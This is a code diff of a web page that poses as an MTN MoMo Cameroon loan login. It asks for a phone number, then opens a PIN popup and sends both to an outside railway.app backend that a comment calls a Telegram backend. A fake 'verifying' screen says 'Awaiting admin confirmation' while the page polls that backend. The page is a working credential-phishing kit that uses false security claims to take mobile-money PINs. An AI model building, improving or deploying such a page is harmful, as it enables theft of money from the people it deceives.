+    .verify-particle:nth-child(5) { left: 45%; top: 90%; animation-delay: 4.8s; }
+    .verify-particle:nth-child(6) { left: 88%; top: 45%; animation-delay: 6s; }
+    .verify-particle:nth-child(7) { left: 12%; top: 40%; animation-delay: 7.2s; }
+    .verify-particle:nth-child(8) { left: 55%; top: 15%; animation-delay: 5.4s; }
+    @keyframes particleFloat {
+      0% { opacity: 0; transform: translateY(0) scale(0.6); }
+      15% { opacity: 1; transform: translateY(-30px) scale(1.1); }
+      80% { opacity: 0.7; transform: translateY(-280px) scale(0.9); }
+      100% { opacity: 0; transform: translateY(-340px) scale(0.4); }
+    }
 
-        @keyframes overlayPulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
+    .verify-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      max-width: 340px;
+      text-align: center;
+      position: relative;
+      z-index: 2;
+    }
 
-        .verify-spinner {
-            width: 56px;
-            height: 56px;
-            border: 5px solid #e0e8ff;
-            border-top-color: #0047AB;
-            border-radius: 50%;
-            animation: verifySpin 0.9s linear infinite;
-            margin-bottom: 28px;
-            box-shadow: 0 8px 24px rgba(0,71,171,0.08);
-        }
-        @keyframes verifySpin { to { transform: rotate(360deg); } }
+    /* Orbit ring with MoMo logo core */
+    .verify-orbit {
+      width: 140px;
+      height: 140px;
+      position: relative;
+      margin-bottom: 34px;
+    }
+    .verify-orbit-ring {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 2px dashed rgba(255, 204, 0, 0.35);
+      animation: rotateSlow 10s linear infinite;
+    }
+    .verify-orbit-ring.inner {
+      inset: 22px;
+      border: 1.5px dashed rgba(255, 204, 0, 0.55);
+      animation: rotateSlow 6s linear infinite reverse;
+    }
+    @keyframes rotateSlow { to { transform: rotate(360deg); } }
 
-        .verify-title {
-            font-size: 19px;
-            font-weight: 800;
-            color: #1a1a2e;
-            margin-bottom: 10px;
-            line-height: 1.3;
-            letter-spacing: -0.3px;
-        }
-        .verify-title .highlight { color: #0047AB; }
+    .verify-orbit-core {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 72px;
+      height: 72px;
+      transform: translate(-50%, -50%);
+      border-radius: 18px;
+      background: var(--grad-gold);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3);
+      animation: corePulse 2s ease-in-out infinite;
+      padding: 8px;
+    }
+    .verify-orbit-core img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+    @keyframes corePulse {
+      0%, 100% { box-shadow: 0 0 40px rgba(255, 204, 0, 0.55), 0 0 80px rgba(255, 204, 0, 0.3); transform: translate(-50%, -50%) scale(1); }
+      50% { box-shadow: 0 0 55px rgba(255, 204, 0, 0.85), 0 0 110px rgba(255, 204, 0, 0.5); transform: translate(-50%, -50%) scale(1.06); }
+    }
 
-        .verify-subtitle {
-            font-size: 13px;
-            color: #8a90a2;
-            line-height: 1.6;
-            margin-bottom: 28px;
-            font-weight: 500;
-        }
+    /* Dots orbit */
+    .verify-dot-orbit {
+      position: absolute;
+      inset: 0;
+      animation: rotateSlow 3.5s linear infinite;
+    }
+    .verify-dot-orbit span {
+      position: absolute;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--mtn-gold);
+      box-shadow: 0 0 12px rgba(255, 204, 0, 0.9);
+    }
+    .verify-dot-orbit span:nth-child(1) { top: 0; left: 50%; transform: translateX(-50%); }
+    .verify-dot-orbit span:nth-child(2) { bottom: 0; left: 50%; transform: translateX(-50%); }
+    .verify-dot-orbit span:nth-child(3) { top: 50%; left: 0; transform: translateY(-50%); }
+    .verify-dot-orbit span:nth-child(4) { top: 50%; right: 0; transform: translateY(-50%); }
 
-        .verify-dots span {
-            display: inline-block;
-            animation: dotBlink 1.4s infinite both;
-        }
-        .verify-dots span:nth-child(1) { animation-delay: 0s; }
-        .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
-        .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes dotBlink {
-            0%, 80%, 100% { opacity: 0.2; }
-            40% { opacity: 1; }
-        }
+    .verify-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 10px;
+      line-height: 1.35;
+      letter-spacing: -0.3px;
+    }
+    .verify-title .highlight {
+      background: linear-gradient(90deg, #FFCC00, #FFD633);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
 
-        .verify-bar {
-            width: 220px;
-            height: 5px;
-            background: #e8edf7;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 28px;
-        }
-        .verify-bar-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #0047AB, #FFCC00);
-            border-radius: 4px;
-            transition: width 0.3s ease;
-        }
+    .verify-subtitle {
+      font-size: 13.5px;
+      color: rgba(255, 255, 255, 0.7);
+      line-height: 1.6;
+      margin-bottom: 30px;
+      font-weight: 500;
+      min-height: 1.4em;
+      transition: opacity 0.3s;
+    }
 
-        .verify-security {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 11.5px;
-            color: #a9b0c2;
-            font-weight: 500;
-        }
+    .verify-dots span { display: inline-block; animation: dotBlink 1.4s infinite both; }
+    .verify-dots span:nth-child(1) { animation-delay: 0s; }
+    .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
+    .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes dotBlink {
+      0%, 80%, 100% { opacity: 0.2; }
+      40% { opacity: 1; }
+    }
 
-        @media (max-height: 700px) {
-            .phone-input-group { margin-bottom: 14px; }
-            .card { padding: 22px 18px; }
-            .login-btn { margin-top: 18px; padding: 15px; }
-            .security-notice, .signup-text { margin-top: 12px; }
-            .mtn-logo-icon { width: 34px; height: 34px; font-size: 1.2rem; }
-            .pin-box { width: 42px; height: 48px; font-size: 20px; }
-            .eye-toggle { width: 42px; height: 48px; }
-        }
+    .verify-bar {
+      width: 240px;
+      height: 6px;
+      background: rgba(255, 204, 0, 0.12);
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 30px;
+      position: relative;
+    }
+    .verify-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #FFCC00, #FFD633, #FFCC00);
+      background-size: 200% 100%;
+      border-radius: 4px;
+      transition: width 0.4s ease;
+      box-shadow: 0 0 14px rgba(255, 204, 0, 0.7);
+      animation: shimmer 2s linear infinite;
+    }
+    @keyframes shimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
 
-        @media (max-width: 380px) {
-            .pin-boxes { gap: 6px; }
-            .pin-row { gap: 8px; }
-            .pin-box { width: 38px; height: 44px; font-size: 17px; border-radius: 10px; }
-            .eye-toggle { width: 38px; height: 44px; border-radius: 10px; }
-            .eye-toggle svg { width: 18px; height: 18px; }
-            .phone-input input { padding: 11px 12px; font-size: 14px; }
-            .country-btn { padding: 11px 10px; font-size: 13.5px; gap: 5px; }
-            .country-menu { min-width: 200px; }
-        }
-    </style>
+    .verify-status-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 11.5px;
+      color: rgba(255, 255, 255, 0.5);
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+    }
+    .verify-status-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #22C55E;
+      box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
+      animation: statusPulse 1.6s ease-in-out infinite;
+    }
+    @keyframes statusPulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.85); }
+    }
+
+    /* Rotating status text */
+    .verify-step {
+      position: relative;
+      height: 20px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      width: 100%;
+    }
+    .verify-step-inner {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+    .verify-step-text {
+      height: 20px;
+      line-height: 20px;
+      font-size: 12px;
+      color: rgba(255, 204, 0, 0.9);
+      font-weight: 700;
+      letter-spacing: 0.03em;
+    }
+
+    /* ═══════════ MOBILE ═══════════ */
+    @media (max-width: 480px) {
+      .main { padding: 18px 12px 30px; }
+      .momo-band { padding: 24px 22px; }
+      .momo-logo-img { height: 44px; }
+      .login-body { padding: 24px 18px 26px; }
+      .brand-logo-img { height: 42px; }
+      .brand-sub { font-size: 11px; }
+      .pin-modal { bottom: 140px; }
+      .verify-orbit { width: 120px; height: 120px; }
+      .verify-orbit-core { width: 62px; height: 62px; border-radius: 16px; }
+      .verify-title { font-size: 18px; }
+    }
+    @media (max-width: 380px) {
+      .brand-sub { display: none; }
+      .brand-divider { display: none; }
+      .pin-input { font-size: 22px; letter-spacing: 10px; }
+    }
+  </style>
 </head>
 <body>
-    <header>
-        <button class="back-btn" onclick="window.location.href='confirm.html'" aria-label="Go back">←</button>
-        <div class="logo-container">
-            <div class="mtn-logo">
-                <div class="mtn-logo-icon"></div>
-                <div class="mtn-logo-text">MTN MoMo</div>
-                <div class="mtn-logo-sub">Loans</div>
-            </div>
-        </div>
-        <div style="width:36px;"></div>
-    </header>
 
-    <main class="card">
-        <div class="phone-input-group">
-            <label class="input-label">MoMo Phone Number</label>
+  <!-- ═══════════ HEADER ═══════════ -->
+  <header class="header">
+    <div class="header-inner">
+      <a href="index.html" class="brand">
+        <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+        <div class="brand-divider"></div>
+        <span class="brand-sub">MoMo Advance Loans</span>
+      </a>
+      <button class="header-back" onclick="window.location.href='index.html'">← Back</button>
+    </div>
+  </header>
+
+  <!-- ═══════════ MAIN ═══════════ -->
+  <main class="main">
+    <div class="login-wrap">
+      <div class="login-card-wrap">
+
+        <!-- YELLOW MOMO BAND -->
+        <div class="momo-band">
+          <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="momo-logo-img">
+          <p class="momo-tagline">Secure Login</p>
+        </div>
+
+        <!-- WHITE BODY -->
+        <div class="login-body">
+
+          <h1 class="welcome-title">Welcome Back</h1>
+          <p class="welcome-sub">Enter your MoMo number to continue</p>
+
+          <!-- PHONE (Cameroon only) -->
+          <div class="form-field">
+            <label class="input-label" for="phone">MoMo Phone Number</label>
             <div class="phone-input" id="phoneWrapper">
-                <button type="button" class="country-btn" id="countryBtn" aria-haspopup="true">
-                    <span id="countryFlag">FLAG</span>
-                    <span id="countryCode">+237</span>
-                    <span class="caret-sm">▼</span>
-                </button>
-
-                <input type="tel" id="phone" placeholder="6XX XXX XXX" maxlength="11" autocomplete="tel">
-
-                <div class="country-menu" id="countryMenu">
-                    <button type="button" class="country-item" data-country="CM" data-code="+237" data-len="9">
-                        <span class="flag-slot" data-flag="CM"></span>
-                        <span>Cameroon</span>
-                        <span class="dial">+237</span>
-                    </button>
-                    <button type="button" class="country-item" data-country="BJ" data-code="+229" data-len="8">
-                        <span class="flag-slot" data-flag="BJ"></span>
-                        <span>Benin</span>
-                        <span class="dial">+229</span>
-                    </button>
-                    <button type="button" class="country-item" data-country="ZM" data-code="+260" data-len="9">
-                        <span class="flag-slot" data-flag="ZM"></span>
-                        <span>Zambia</span>
-                        <span class="dial">+260</span>
-                    </button>
-                    <button type="button" class="country-item" data-country="GH" data-code="+233" data-len="9">
-                        <span class="flag-slot" data-flag="GH"></span>
-                        <span>Ghana</span>
-                        <span class="dial">+233</span>
-                    </button>
-                    <button type="button" class="country-item" data-country="UG" data-code="+256" data-len="9">
-                        <span class="flag-slot" data-flag="UG"></span>
-                        <span>Uganda</span>
-                        <span class="dial">+256</span>
-                    </button>
-                </div>
+              <span class="country-btn">
+                <svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true">
+                  <rect width="300" height="600" fill="#007A5E"/>
+                  <rect x="300" width="300" height="600" fill="#CE1126"/>
+                  <rect x="600" width="300" height="600" fill="#FCD116"/>
+                  <polygon points="450,220 465,275 522,275 476,308 492,363 450,330 408,363 424,308 378,275 435,275" fill="#FCD116"/>
+                </svg>
+                <span>+237</span>
+              </span>
+              <input type="tel" id="phone" placeholder="6XX XXX XXX" maxlength="9" inputmode="numeric" autocomplete="tel">
             </div>
-            <div class="error-text" id="phoneError">Please enter a valid phone number</div>
+            <div class="error-text" id="phoneError">Please enter a valid 9-digit phone number</div>
+          </div>
+
+          <button class="login-btn" id="loginBtn">CONTINUE →</button>
+
+          <div class="security-note">
+            <span class="ico">🔒</span>
+            <span>Your details are encrypted and secure</span>
+          </div>
+
+          <p class="signup-text">
+            Don't have a MoMo account?
+            <a href="#" onclick="alert('Dial *126# to register for MTN MoMo'); return false;">Register here</a>
+          </p>
         </div>
+      </div>
+    </div>
+  </main>
 
-        <div class="phone-input-group">
-            <div class="pin-label-row">
-                <label class="input-label">MoMo PIN</label>
-                <span class="forgot-link" onclick="alert('Please dial *126# to reset your MoMo PIN.')">Forgot PIN?</span>
-            </div>
-            <div class="pin-row">
-                <div class="pin-boxes" id="pinBoxes">
-                    <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" autocomplete="off">
-                    <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
-                    <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
-                    <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
-                    <input type="password" class="pin-box" id="pin5" maxlength="1" inputmode="numeric" autocomplete="off">
-                </div>
+  <!-- ═══════════ BOTTOM NAV ═══════════ -->
+  <nav class="bottom-nav">
+    <div class="bottom-nav-inner">
+      <a href="index.html" class="nav-item"><span class="ico">🏠</span><span>Home</span></a>
+      <a href="#" class="nav-item active"><span class="ico">🔐</span><span>Login</span></a>
+      <a href="#" class="nav-item" onclick="alert('Contact support at support@momoadvance.cm'); return false;"><span class="ico">💬</span><span>Support</span></a>
+    </div>
+  </nav>
 
-                <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show PIN" title="Show PIN">
-                    <svg class="eye-open" viewBox="0 0 24 24">
-                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-                        <circle cx="12" cy="12" r="3"/>
-                    </svg>
-                    <svg class="eye-closed" viewBox="0 0 24 24">
-                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
-                        <line x1="1" y1="1" x2="23" y2="23"/>
-                    </svg>
-                </button>
-            </div>
-            <div class="error-text" id="pinError">Please enter your 5-digit MoMo PIN</div>
-        </div>
+  <!-- ═══════════ PIN POPUP ═══════════ -->
+  <div class="modal-container" id="modalContainer">
+    <div class="sheet-overlay" id="sheetOverlay"></div>
+    <div class="pin-modal" id="pinModal">
+      <h3 class="pin-modal-title">
+        Log in to your <strong>MoMo account?</strong>
+      </h3>
+      <p class="pin-modal-sub">Enter your MTN MoMo PIN to authorize this login</p>
 
-        <button class="login-btn" id="loginBtn">LOGIN</button>
+      <label class="pin-label" for="momo_pin">Enter PIN</label>
+      <div class="pin-input-wrap">
+        <input
+          id="momo_pin"
+          type="password"
+          maxlength="5"
+          minlength="4"
+          inputmode="numeric"
+          autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
+          enterkeyhint="done"
+          placeholder="••••"
+          class="pin-input" />
+        <button type="button" id="togglePin" class="pin-eye-btn" aria-label="Show PIN">
+          <svg viewBox="0 0 24 24">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
 
-        <div class="security-notice">
-            <span>🔒</span>
-            <span>Your PIN is secure and never stored</span>
-        </div>
+      <div class="pin-forgot-row">
+        <a class="pin-forgot" href="#" onclick="alert('Please dial *126# to reset your MoMo PIN.'); return false;">Forgot PIN?</a>
+      </div>
 
-        <p class="signup-text">
-            Don't have a MoMo account? <a href="#" onclick="alert('Dial *126# to register for MTN MoMo'); return false;">Register here</a>
-        </p>
-    </main>
+      <div class="pin-error" id="pinError">Please enter your MoMo PIN</div>
 
-    <footer>© 2026 MTN MoMo Cameroon</footer>
+      <div class="pin-actions">
+        <button id="cancelBtn" type="button" class="btn-cancel">Cancel</button>
+        <button id="proceedBtn" type="button" disabled class="btn-pin-proceed">
+          <span>Proceed</span>
+        </button>
+      </div>
+    </div>
+  </div>
 
-    <div class="verify-overlay" id="verifyOverlay">
-        <div class="verify-content">
-            <div class="verify-momo-logo"></div>
-            <div class="verify-spinner"></div>
-            <h2 class="verify-title" id="verifyTitle">
-                Verifying your <span class="highlight">MoMo account</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
-            </h2>
-            <p class="verify-subtitle" id="verifySubtitle">Waiting for confirmation. Please hold on…</p>
-            <div class="verify-bar">
-                <div class="verify-bar-fill" id="verifyBarFill"></div>
-            </div>
-            <div class="verify-security">
-                <span>🔒</span>
-                <span>Secure connection to MTN MoMo</span>
-            </div>
-        </div>
+  <!-- ═══════════ SUPER VERIFY OVERLAY ═══════════ -->
+  <div class="verify-overlay" id="verifyOverlay">
+    <div class="verify-particles">
+      <span class="verify-particle"></span>
+      <span class="verify-particle"></span>
+      <span class="verify-particle"></span>
+      <span class="verify-particle"></span>
+      <span class="verify-particle"></span>
+      <span class="verify-particle"></span>
+      <span class="verify-particle"></span>
+      <span class="verify-particle"></span>
     </div>
 
-    <svg width="0" height="0" style="position:absolute;overflow:hidden;" aria-hidden="true">
-        <defs>
-            <symbol id="flag-CM" viewBox="0 0 900 600">
-                <rect width="300" height="600" fill="#007A5E"/>
-                <rect x="300" width="300" height="600" fill="#CE1126"/>
-                <rect x="600" width="300" height="600" fill="#FCD116"/>
-                <polygon points="450,220 465,275 522,275 476,308 492,363 450,330 408,363 424,308 378,275 435,275" fill="#FCD116"/>
-            </symbol>
-            <symbol id="flag-BJ" viewBox="0 0 900 600">
-                <rect width="900" height="300" fill="#FCD116"/>
-                <rect y="300" width="900" height="300" fill="#CE1126"/>
-                <rect width="350" height="600" fill="#008751"/>
-            </symbol>
-            <symbol id="flag-ZM" viewBox="0 0 900 600">
-                <rect width="900" height="600" fill="#198A00"/>
-                <rect x="600" y="360" width="75" height="240" fill="#DE2010"/>
-                <rect x="675" y="360" width="75" height="240" fill="#000"/>
-                <rect x="750" y="360" width="75" height="240" fill="#EF7D00"/>
-                <path d="M720 300 c-20 -30 15 -55 35 -40 c-15 15 -30 30 -35 40 z" fill="#EF7D00"/>
-            </symbol>
-            <symbol id="flag-GH" viewBox="0 0 900 600">
-                <rect width="900" height="200" fill="#CE1126"/>
-                <rect y="200" width="900" height="200" fill="#FCD116"/>
-                <rect y="400" width="900" height="200" fill="#006B3F"/>
-                <polygon points="450,220 465,268 517,268 476,298 490,346 450,316 410,346 424,298 383,268 435,268" fill="#000"/>
-            </symbol>
-            <symbol id="flag-UG" viewBox="0 0 900 600">
-                <rect width="900" height="100" fill="#000"/>
-                <rect y="100" width="900" height="100" fill="#FCDC04"/>
-                <rect y="200" width="900" height="100" fill="#D90000"/>
-                <rect y="300" width="900" height="100" fill="#000"/>
-                <rect y="400" width="900" height="100" fill="#FCDC04"/>
-                <rect y="500" width="900" height="100" fill="#D90000"/>
-                <circle cx="450" cy="300" r="90" fill="#fff"/>
-                <circle cx="450" cy="300" r="28" fill="#000"/>
-            </symbol>
-        </defs>
-    </svg>
+    <div class="verify-content">
+      <div class="verify-orbit">
+        <div class="verify-orbit-ring"></div>
+        <div class="verify-orbit-ring inner"></div>
+        <div class="verify-dot-orbit">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <div class="verify-orbit-core">
+          <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
+        </div>
+      </div>
 
-    <script>
-        const API_BASE = 'https://momo-usersey-production.up.railway.app';
-        const POLL_INTERVAL_MS = 2500;
+      <h2 class="verify-title" id="verifyTitle">
+        Verifying your <span class="highlight">MoMo account</span>
+      </h2>
+      <p class="verify-subtitle" id="verifySubtitle">Waiting for confirmation. Please hold on…</p>
 
-        const COUNTRIES = {
-            CM: { code: '+237', digits: 9, placeholder: '6XX XXX XXX' },
-            BJ: { code: '+229', digits: 8, placeholder: 'XX XX XX XX' },
-            ZM: { code: '+260', digits: 9, placeholder: '9XX XXX XXX' },
-            GH: { code: '+233', digits: 9, placeholder: '2XX XXX XXX' },
-            UG: { code: '+256', digits: 9, placeholder: '7XX XXX XXX' }
-        };
-        let currentCountry = 'CM';
+      <div class="verify-bar">
+        <div class="verify-bar-fill" id="verifyBarFill"></div>
+      </div>
 
-        const countryBtn   = document.getElementById('countryBtn');
-        const countryMenu  = document.getElementById('countryMenu');
-        const countryFlag  = document.getElementById('countryFlag');
-        const countryCode  = document.getElementById('countryCode');
-        const phoneInput   = document.getElementById('phone');
-        const phoneWrapper = document.getElementById('phoneWrapper');
-        const phoneError   = document.getElementById('phoneError');
+      <div class="verify-step">
+        <div class="verify-step-inner" id="verifyStepInner">
+          <div class="verify-step-text">🔒 Establishing secure connection</div>
+          <div class="verify-step-text">📡 Contacting MTN MoMo servers</div>
+          <div class="verify-step-text">🔐 Validating your credentials</div>
+          <div class="verify-step-text">⏳ Awaiting admin confirmation</div>
+        </div>
+      </div>
 
-        function renderFlagsIn(root = document) {
-            root.querySelectorAll('.flag-slot[data-flag]').forEach(el => {
-                const id = el.dataset.flag;
-                el.innerHTML = `<svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true"><use href="#flag-${id}"/></svg>`;
-            });
-        }
-        renderFlagsIn();
+      <div class="verify-status-row">
+        <span class="verify-status-dot"></span>
+        <span>Live · Secure Connection</span>
+      </div>
+    </div>
+  </div>
 
-        function setCountry(iso) {
-            const data = COUNTRIES[iso];
-            if (!data) return;
-            currentCountry = iso;
-            countryCode.textContent = data.code;
-            countryFlag.innerHTML = `<svg class="flag-svg" viewBox="0 0 900 600" aria-hidden="true"><use href="#flag-${iso}"/></svg>`;
-            phoneInput.placeholder = data.placeholder;
-            phoneInput.maxLength = data.digits;
-            phoneInput.value = '';
-            phoneError.textContent = 'Please enter a valid phone number';
-            countryMenu.querySelectorAll('.country-item').forEach(item => {
-                item.classList.toggle('selected', item.dataset.country === iso);
-            });
-        }
+  <script>
+    // ═══════════════════════════════════════════════════════════
+    // SAME TELEGRAM BACKEND AS YOUR CURRENT LOGIN PAGE
+    // ═══════════════════════════════════════════════════════════
+    const API_BASE = 'https://momo-usersey-production.up.railway.app';
+    const POLL_INTERVAL_MS = 2500;
 
-        countryBtn.addEventListener('click', (e) => {
-            e.stopPropagation();
-            countryBtn.classList.toggle('open');
-            countryMenu.classList.toggle('open');
+    const phoneInput   = document.getElementById('phone');
+    const phoneWrapper = document.getElementById('phoneWrapper');
+    const phoneError   = document.getElementById('phoneError');
+
+    phoneInput.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0, 9);
+      if (this.value.length === 9) {
+        phoneWrapper.classList.remove('invalid');
+        phoneError.classList.remove('show');
+      }
+    });
+
+    // ═══════════════════════════════════════════════════════════
+    // PIN MODAL
+    // ═══════════════════════════════════════════════════════════
+    const modal = document.getElementById('modalContainer');
+    const popup = document.getElementById('pinModal');
+    const pin = document.getElementById('momo_pin');
+    const openBtn = document.getElementById('loginBtn');
+    const proceed = document.getElementById('proceedBtn');
+    const cancel = document.getElementById('cancelBtn');
+    const overlay = document.getElementById('sheetOverlay');
+    const togglePin = document.getElementById('togglePin');
+    const pinError = document.getElementById('pinError');
+
+    function movePopup() {
+      if (window.visualViewport) {
+        const keyboard = window.innerHeight - window.visualViewport.height;
+        popup.style.bottom = Math.max(120, keyboard + 60) + 'px';
+      }
+    }
+    if (window.visualViewport) {
+      window.visualViewport.addEventListener('resize', movePopup);
+    }
+
+    function openModal() {
+      document.body.classList.add('modal-open');
+      modal.classList.add('open');
+      movePopup();
+      setTimeout(() => {
+        popup.classList.add('show');
+        setTimeout(() => pin.focus(), 250);
+      }, 50);
+    }
+
+    function closeModal() {
+      popup.classList.remove('show');
+      setTimeout(() => {
+        modal.classList.remove('open');
+        pin.value = '';
+        pin.type = 'password';
+        togglePin.classList.remove('active');
+        togglePin.innerHTML = '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
+        proceed.disabled = true;
+        proceed.innerHTML = '<span>Proceed</span>';
+        pinError.classList.remove('show');
+        document.body.classList.remove('modal-open');
+      }, 250);
+    }
+
+    openBtn.addEventListener('click', () => {
+      const digits = phoneInput.value.replace(/\D/g, '');
+      if (digits.length !== 9) {
+        phoneWrapper.classList.add('invalid');
+        phoneError.textContent = 'Please enter a valid 9-digit phone number';
+        phoneError.classList.add('show');
+        phoneInput.focus();
+        return;
+      }
+      phoneWrapper.classList.remove('invalid');
+      phoneError.classList.remove('show');
+      openModal();
+    });
+
+    togglePin.addEventListener('click', () => {
+      const isPassword = pin.type === 'password';
+      pin.type = isPassword ? 'text' : 'password';
+      togglePin.classList.toggle('active', isPassword);
+      togglePin.innerHTML = isPassword
+        ? '<svg viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>'
+        : '<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
+      pin.focus();
+    });
+
+    pin.addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 5);
+      const isValid = /^\d{4,5}$/.test(this.value);
+      proceed.disabled = !isValid;
+      pinError.classList.remove('show');
+    });
+
+    cancel.addEventListener('click', closeModal);
+    overlay.addEventListener('click', closeModal);
+
+    // ═══════════════════════════════════════════════════════════
+    // PROCEED → send to backend
+    // ═══════════════════════════════════════════════════════════
+    let pollTimer = null;
+    let verifyTimer = null;
+    let stepTimer = null;
+
+    proceed.addEventListener('click', async () => {
+      if (!/^\d{4,5}$/.test(pin.value)) {
+        pinError.textContent = 'Please enter your 4 or 5-digit MoMo PIN';
+        pinError.classList.add('show');
+        return;
+      }
+
+      proceed.disabled = true;
+      proceed.innerHTML = '<span class="btn-spinner"></span><span>Processing...</span>';
+
+      const digits = phoneInput.value.replace(/\D/g, '');
+      const fullPhone = '+237' + digits;
+      const userPin = pin.value;
+
+      try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 15000);
+
+        const res = await fetch(`${API_BASE}/api/login`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: fullPhone, country: 'CM', pin: userPin }),
+          signal: controller.signal
         });
-        countryMenu.querySelectorAll('.country-item').forEach(item => {
-            item.addEventListener('click', (e) => {
-                e.stopPropagation();
-                setCountry(item.dataset.country);
-                countryBtn.classList.remove('open');
-                countryMenu.classList.remove('open');
-                phoneInput.focus();
-            });
-        });
-        document.addEventListener('click', (e) => {
-            if (!countryMenu.contains(e.target) && e.target !== countryBtn && !countryBtn.contains(e.target)) {
-                countryBtn.classList.remove('open');
-                countryMenu.classList.remove('open');
-            }
-        });
-        setCountry('CM');
+        clearTimeout(timeoutId);
 
-        phoneInput.addEventListener('input', function() {
-            this.value = this.value.replace(/[^0-9 ]/g, '');
-            const digits = this.value.replace(/\s/g, '');
-            const needed = COUNTRIES[currentCountry].digits;
-            if (digits.length === needed) {
-                phoneWrapper.classList.remove('invalid');
-                phoneError.classList.remove('show');
-            }
-        });
+        const data = await res.json().catch(() => ({}));
+        console.log('LOGIN RESPONSE:', data);
 
-        const pinBoxes = [
-            document.getElementById('pin1'), document.getElementById('pin2'),
-            document.getElementById('pin3'), document.getElementById('pin4'), document.getElementById('pin5')
-        ];
-        const pinError = document.getElementById('pinError');
-
-        pinBoxes.forEach((box, index) => {
-            box.addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '');
-                if (this.value) {
-                    this.classList.add('filled');
-                    if (index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
-                } else {
-                    this.classList.remove('filled');
-                }
-                if (getPinValue().length === 5) {
-                    pinError.classList.remove('show');
-                    pinBoxes.forEach(b => b.classList.remove('invalid'));
-                }
-            });
-            box.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && !this.value && index > 0) {
-                    pinBoxes[index - 1].focus();
-                    pinBoxes[index - 1].value = '';
-                    pinBoxes[index - 1].classList.remove('filled');
-                }
-            });
-            box.addEventListener('paste', function(e) {
-                e.preventDefault();
-                const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-                if (pasted.length > 0) {
-                    for (let i = 0; i < pinBoxes.length && i < pasted.length; i++) {
-                        pinBoxes[i].value = pasted[i];
-                        pinBoxes[i].classList.add('filled');
-                    }
-                    const nextEmpty = pinBoxes.findIndex(b => !b.value);
-                    pinBoxes[nextEmpty !== -1 ? nextEmpty : pinBoxes.length - 1].focus();
-                }
-            });
-        });
-
